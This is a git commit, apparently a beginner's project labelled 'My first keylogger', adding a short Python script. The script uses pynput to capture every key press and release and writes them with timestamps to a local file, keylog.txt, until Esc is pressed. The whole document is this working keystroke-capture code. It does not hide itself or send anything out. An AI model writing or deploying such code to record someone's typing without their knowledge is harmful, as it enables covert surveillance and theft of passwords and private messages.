c790c6808d90a379c96e187cfff3f02d836fe587
Ashoksahani93 <as93982398@gmail.com>
2026-03-09 12:30:55 +0530

    My first keylogger

---
+++ keylogger.py
@@ -0,0 +1,17 @@
+from pynput import keyboard
+import logging
+
+log_file = "keylog.txt"
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    try:
+        logging.info(f'Key pressed: {key.char}')
+    except AttributeError:
+        logging.info(f'Special key pressed: {key}')
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
